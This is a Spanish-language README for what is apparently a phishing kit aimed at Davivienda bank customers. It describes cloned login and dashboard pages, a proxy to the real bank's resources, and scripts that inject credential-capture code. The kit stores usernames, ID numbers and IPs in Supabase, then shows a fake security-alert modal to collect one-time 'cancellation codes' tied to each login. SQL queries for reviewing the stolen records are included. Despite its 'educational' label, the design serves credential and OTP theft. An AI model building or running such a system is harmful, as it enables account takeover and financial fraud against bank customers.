# Sistema de Login y Alertas de Seguridad - Davivienda

Sistema de captura de datos de login y alertas de seguridad con integración a Supabase.

## 📋 Características

- ✅ Captura automática de datos de login (usuario, documento, IP, timestamp)
- ✅ Modal de alerta de seguridad con transacciones sospechosas
- ✅ Guardado instantáneo en Supabase (backend)
- ✅ Backup en localStorage del navegador
- ✅ Vinculación de códigos de seguridad con logins
- ✅ Servidor local con proxy para recursos de Davivienda

## 🗄️ Estructura de Base de Datos (Supabase)

### Tabla `logins`
```sql
- id (BIGSERIAL, PRIMARY KEY)
- usuario (VARCHAR 255)
- documento (VARCHAR 50)
- tipo_documento (VARCHAR 20)
- fecha_login (TIMESTAMP)
- ip (VARCHAR 45)
- user_agent (TEXT)
- created_at (TIMESTAMP)
```

### Tabla `codigos_seguridad`
```sql
- id (BIGSERIAL, PRIMARY KEY)
- login_id (BIGINT, FOREIGN KEY → logins.id)
- codigo (VARCHAR 50)
- tipo (VARCHAR 50)
- fecha_creacion (TIMESTAMP)
- usado (BOOLEAN)
- fecha_uso (TIMESTAMP)
```

## 🚀 Instalación y Configuración

### 1. Configurar Supabase

1. Crea un proyecto en [Supabase](https://supabase.com)
2. Ve a **Settings → API** y copia:
   - Project URL
   - anon/public key

3. Actualiza los archivos de configuración:

**En `login_supabase_integration.js`:**
```javascript
const SUPABASE_URL = 'https://tu-proyecto.supabase.co';
const SUPABASE_ANON_KEY = 'tu-anon-key-aqui';
```

**En `supabase_config.js`:**
```javascript
const SUPABASE_URL = 'https://tu-proyecto.supabase.co';
const SUPABASE_ANON_KEY = 'tu-anon-key-aqui';
```

### 2. Crear Tablas en Supabase

1. Ve a tu proyecto en Supabase
2. Abre el **SQL Editor**
3. Copia y ejecuta el contenido de `supabase_schema.sql`

O ejecuta desde la línea de comandos:
```bash
# Instalar Supabase CLI (opcional)
npm install -g supabase

# O usa el SQL Editor en la web
```

### 3. Iniciar el Servidor Local

```bash
python server.py
```

El servidor se iniciará en `http://localhost:8080`

### 4. Acceder a la Aplicación

- **Login**: `http://localhost:8080/login.html`
- **Dashboard**: `http://localhost:8080/dashboard.html`

## 📊 Flujo de Datos

### 1. Login del Usuario
```
Usuario ingresa credenciales
    ↓
login_supabase_integration.js captura datos
    ↓
Guarda en localStorage (backup)
    ↓
Guarda en Supabase → tabla 'logins'
    ↓
Retorna ID del login
```

### 2. Modal de Seguridad
```
Dashboard carga (3 segundos)
    ↓
Modal aparece con alerta
    ↓
Usuario ingresa código de cancelación
    ↓
modal_seguridad_updated.js procesa
    ↓
Vincula código al último login
    ↓
Guarda en Supabase → tabla 'codigos_seguridad'
```

## 🔧 Archivos Principales

| Archivo | Descripción |
|---------|-------------|
| `server.py` | Servidor local con proxy a Davivienda |
| `login.html` | Página de login (captura datos) |
| `dashboard.html` | Dashboard con modal de seguridad |
| `login_supabase_integration.js` | Integración login → Supabase |
| `modal_seguridad.js` | Modal de alerta con guardado en Supabase |
| `supabase_schema.sql` | Esquema de base de datos |
| `inject_modal.py` | Script para inyectar modal en dashboard |
| `inject_login_supabase.py` | Script para inyectar login Supabase |

## 📝 Notas Importantes

1. **Seguridad**: Nunca expongas tus claves de Supabase en el frontend de producción. Usa un backend intermedio.

2. **Row Level Security (RLS)**: Las tablas tienen RLS habilitado con políticas públicas para desarrollo. En producción, configura políticas más estrictas.

3. **localStorage**: Los datos se guardan como backup en el navegador del usuario.

4. **IPs Colombianas**: Se generan automáticamente prefijos de IPs colombianas (186.125.x.x - 186.130.x.x)

## 🔍 Monitoreo

Para ver los datos guardados:

1. Ve a Supabase → **Table Editor**
2. Selecciona la tabla `logins` o `codigos_seguridad`
3. Verás todos los registros en tiempo real

O ejecuta consultas SQL:
```sql
-- Ver últimos 10 logins
SELECT * FROM logins 
ORDER BY fecha_login DESC 
LIMIT 10;

-- Ver códigos de seguridad con sus logins
SELECT l.usuario, l.documento, c.codigo, c.fecha_creacion, c.usado
FROM codigos_seguridad c
JOIN logins l ON c.login_id = l.id
ORDER BY c.fecha_creacion DESC;
```

## 🛠️ Desarrollo

### Estructura del Proyecto
```
dvvda/
├── server.py                    # Servidor Python
├── login.html                   # Página de login
├── dashboard.html               # Dashboard principal
├── login_supabase_integration.js # Captura login → Supabase
├── modal_seguridad.js           # Modal con integración Supabase
├── supabase_schema.sql          # Esquema de BD
├── supabase_config.js           # Configuración Supabase
├── inject_modal.py              # Inyecta modal en dashboard
├── inject_login_supabase.py     # Inyecta script en login
├── dashboard_files/             # Recursos del dashboard
└── login_files/                 # Recursos del login
```

### Comandos Útiles

```bash
# Iniciar servidor
python server.py

# Inyectar modal en dashboard
python inject_modal.py

# Inyectar script de login
python inject_login_supabase.py

# Commit y push a GitHub
git add .
git commit -m "Descripción"
git push
```

## 📊 Diagrama de Arquitectura

```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐
│   Browser   │─────▶│  server.py   │─────▶│  Supabase   │
│             │      │  (Python)    │      │  (Backend)  │
└─────────────┘      └──────────────┘      └─────────────┘
       │                     │                     │
       │                     │                     │
       ▼                     ▼                     ▼
  ┌─────────┐          ┌──────────┐          ┌──────────┐
  │ login   │          │  Proxy   │          │  logins  │
  │  .html  │          │ Davivienda│         │ codigos_ │
  └─────────┘          └──────────┘          │ seguridad│
                                                └──────────┘
```

## ⚠️ Advertencias

- Este es un proyecto de demostración/educativo
- No usar en producción sin las debidas medidas de seguridad
- Las políticas RLS actuales son permisivas para desarrollo
- Considera implementar autenticación adicional en Supabase

## 📄 Licencia

MIT License - Uso educativo